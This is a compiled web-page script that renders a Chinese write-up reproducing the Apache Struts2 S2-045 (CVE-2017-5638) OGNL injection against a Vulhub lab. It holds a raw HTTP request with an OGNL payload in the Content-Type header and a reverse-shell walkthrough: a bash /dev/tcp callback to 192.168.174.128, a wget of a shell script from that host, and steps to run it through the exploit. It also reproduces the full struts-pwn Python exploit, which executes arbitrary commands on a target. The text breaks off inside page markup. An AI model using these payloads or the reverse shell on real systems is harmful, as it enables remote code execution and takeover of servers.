import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as l,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const i={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"基于Jakarta Multipart parser的文件上传模块在处理文件上传（multipart）的请求时候对异常信息做了捕获，并对异常信息做了OGNL表达式处理。但在在判断content-type不正确的时候会抛出异常并且带上Content-Type属性值，可通过精心构造附带OGNL表达式的URL导致远程代码执行。",-1),k=n("p",null,"漏洞详情:",-1),d={href:"http://struts.apache.org/docs/s2-045.html",target:"_blank",rel:"noopener noreferrer"},v={href:"https://blog.csdn.net/u011721501/article/details/60768657",target:"_blank",rel:"noopener noreferrer"},m={href:"https://paper.seebug.org/247/",target:"_blank",rel:"noopener noreferrer"},b=p(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行以下命令启动s2-045测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>即可看到上传页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>直接发送如下数据包，可见<code>233*233</code>已成功执行：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Length: 0
Content-Type: %{#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;vulhub&#39;,233*233)}.multipart/form-data
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021053925.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>编写shell脚本并启动http服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot; &gt; shell.sh
python3环境下：python -m http.server 80
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>上传shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wget 192.168.174.128/shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>通过漏洞EXP执行以上命令：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021111745.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>通过漏洞EXP执行以上命令：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021112259.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021112328.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞exp" tabindex="-1"><a class="header-anchor" href="#漏洞exp" aria-hidden="true">#</a> 漏洞EXP</h2><h3 id="exp-1" tabindex="-1"><a class="header-anchor" href="#exp-1" aria-hidden="true">#</a> EXP 1</h3>`,25),g={href:"https://github.com/mazen160/struts-pwn",target:"_blank",rel:"noopener noreferrer"},y=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token comment"># coding=utf-8</span>
<span class="token comment"># *****************************************************</span>
<span class="token comment"># struts-pwn: Apache Struts CVE-2017-5638 Exploit</span>
<span class="token comment"># Author:</span>
<span class="token comment"># Mazin Ahmed &lt;Mazin AT MazinAhmed DOT net&gt;</span>
<span class="token comment"># This code is based on:</span>
<span class="token comment"># https://www.exploit-db.com/exploits/41570/</span>
<span class="token comment"># https://www.seebug.org/vuldb/ssvid-92746</span>
<span class="token comment"># *****************************************************</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> random
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> argparse

<span class="token comment"># Disable SSL warnings</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">import</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3
    requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] CVE: 2017-5638 - Apache Struts2 S2-045&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Struts-PWN - @mazen160&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;\\n%s -h for help.&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-u&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--url&quot;</span><span class="token punctuation">,</span>
                    dest<span class="token operator">=</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Check a single URL.&quot;</span><span class="token punctuation">,</span>
                    action<span class="token operator">=</span><span class="token string">&#39;store&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-l&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--list&quot;</span><span class="token punctuation">,</span>
                    dest<span class="token operator">=</span><span class="token string">&quot;usedlist&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Check a list of URLs.&quot;</span><span class="token punctuation">,</span>
                    action<span class="token operator">=</span><span class="token string">&#39;store&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--cmd&quot;</span><span class="token punctuation">,</span>
                    dest<span class="token operator">=</span><span class="token string">&quot;cmd&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Command to execute. (Default: id)&quot;</span><span class="token punctuation">,</span>
                    action<span class="token operator">=</span><span class="token string">&#39;store&#39;</span><span class="token punctuation">,</span>
                    default<span class="token operator">=</span><span class="token string">&#39;id&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;--check&quot;</span><span class="token punctuation">,</span>
                    dest<span class="token operator">=</span><span class="token string">&quot;do_check&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Check if a target is vulnerable.&quot;</span><span class="token punctuation">,</span>
                    action<span class="token operator">=</span><span class="token string">&#39;store_true&#39;</span><span class="token punctuation">)</span>
args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
url <span class="token operator">=</span> args<span class="token punctuation">.</span>url <span class="token keyword">if</span> args<span class="token punctuation">.</span>url <span class="token keyword">else</span> <span class="token boolean">None</span>
usedlist <span class="token operator">=</span> args<span class="token punctuation">.</span>usedlist <span class="token keyword">if</span> args<span class="token punctuation">.</span>usedlist <span class="token keyword">else</span> <span class="token boolean">None</span>
url <span class="token operator">=</span> args<span class="token punctuation">.</span>url <span class="token keyword">if</span> args<span class="token punctuation">.</span>url <span class="token keyword">else</span> <span class="token boolean">None</span>
cmd <span class="token operator">=</span> args<span class="token punctuation">.</span>cmd <span class="token keyword">if</span> args<span class="token punctuation">.</span>cmd <span class="token keyword">else</span> <span class="token boolean">None</span>
do_check <span class="token operator">=</span> args<span class="token punctuation">.</span>do_check <span class="token keyword">if</span> args<span class="token punctuation">.</span>do_check <span class="token keyword">else</span> <span class="token boolean">None</span>


<span class="token keyword">def</span> <span class="token function">url_prepare</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;#&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;%23&#39;</span><span class="token punctuation">)</span>
    url <span class="token operator">=</span> url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39; &#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;%20&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">&#39;://&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token string">&#39;http&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token string">&#39;://&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">return</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> url_prepare<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;\\n[*] URL: %s&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] CMD: %s&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> <span class="token string">&quot;%{(#_=&#39;multipart/form-data&#39;).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#_memberAccess?&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#_memberAccess=#dm):&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#ognlUtil.getExcludedPackageNames().clear()).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#ognlUtil.getExcludedClasses().clear()).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#context.setMemberAccess(#dm)))).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#cmd=&#39;%s&#39;).&quot;</span> <span class="token operator">%</span> cmd
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#p=new java.lang.ProcessBuilder(#cmds)).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#p.redirectErrorStream(true)).(#process=#p.start()).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;(#ros.flush())}&quot;</span>

    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;struts-pwn (https://github.com/mazen160/struts-pwn)&#39;</span><span class="token punctuation">,</span>
        <span class="token comment"># &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36&#39;,</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Accept&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;*/*&#39;</span>
    <span class="token punctuation">}</span>

    timeout <span class="token operator">=</span> <span class="token number">3</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        output <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
    
    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ChunkedEncodingError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[!] ChunkedEncodingError Error: Making another request to the url.&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            output <span class="token operator">=</span> <span class="token string">b&quot;&quot;</span>
            <span class="token keyword">with</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token keyword">as</span> resp<span class="token punctuation">:</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> resp<span class="token punctuation">.</span>iter_content<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    output <span class="token operator">+=</span> i
        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ChunkedEncodingError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;EXCEPTION::::--&gt; &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Note: Server Connection Closed Prematurely\\n&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;EXCEPTION::::--&gt; &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
            output <span class="token operator">=</span> <span class="token string">&#39;ERROR&#39;</span>
        <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
            output <span class="token operator">=</span> output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;EXCEPTION::::--&gt; &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        output <span class="token operator">=</span> <span class="token string">&#39;ERROR&#39;</span>
    
    <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> url_prepare<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;\\n[*] URL: %s&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>

    random_string <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token string">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> <span class="token string">&quot;%{#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].&quot;</span>
    payload <span class="token operator">+=</span> <span class="token string">&quot;addHeader(&#39;%s&#39;,&#39;%s&#39;)}.multipart/form-data&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>random_string<span class="token punctuation">,</span> random_string<span class="token punctuation">)</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;struts-pwn (https://github.com/mazen160/struts-pwn)&#39;</span><span class="token punctuation">,</span>
        <span class="token comment"># &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36&#39;,</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Accept&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;*/*&#39;</span>
    <span class="token punctuation">}</span>

    timeout <span class="token operator">=</span> <span class="token number">3</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>random_string <span class="token keyword">in</span> resp<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span>random_string<span class="token punctuation">]</span> <span class="token operator">==</span> random_string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            result <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            result <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;EXCEPTION::::--&gt; &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> usedlist<span class="token operator">=</span>usedlist<span class="token punctuation">,</span> cmd<span class="token operator">=</span>cmd<span class="token punctuation">,</span> do_check<span class="token operator">=</span>do_check<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> url<span class="token punctuation">:</span>
        <span class="token keyword">if</span> do_check<span class="token punctuation">:</span>
            result <span class="token operator">=</span> check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token comment"># Only check for existence of Vulnerablity</span>
            output <span class="token operator">=</span> <span class="token string">&#39;[*] Status: &#39;</span>
            <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                output <span class="token operator">+=</span> <span class="token string">&#39;Vulnerable!&#39;</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                output <span class="token operator">+=</span> <span class="token string">&#39;Not Affected.&#39;</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            output <span class="token operator">=</span> exploit<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>  <span class="token comment"># Exploit</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>

    <span class="token keyword">if</span> usedlist<span class="token punctuation">:</span>
        URLs_List <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            f_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>usedlist<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;r&#39;</span><span class="token punctuation">)</span>
            URLs_List <span class="token operator">=</span> f_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;\\r&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                URLs_List<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>
                f_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Error: There was an error in reading list file.&#39;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> url <span class="token keyword">in</span> URLs_List<span class="token punctuation">:</span>
            <span class="token keyword">if</span> do_check<span class="token punctuation">:</span>
                result <span class="token operator">=</span> check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token comment"># Only check for existence of Vulnerablity</span>
                output <span class="token operator">=</span> <span class="token string">&#39;[*] Status: &#39;</span>
                <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                    output <span class="token operator">+=</span> <span class="token string">&#39;Vulnerable!&#39;</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    output <span class="token operator">+=</span> <span class="token string">&#39;Not Affected.&#39;</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                output <span class="token operator">=</span> exploit<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>  <span class="token comment"># Exploit</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[%] Done.&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        main<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> usedlist<span class="token operator">=</span>usedlist<span class="token punctuation">,</span> cmd<span class="token operator">=</span>cmd<span class="token punctuation">,</span> do_check<span class="token operator">=</span>do_check<span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;\\nKeyboardInterrupt Detected.&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Exiting...&#39;</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 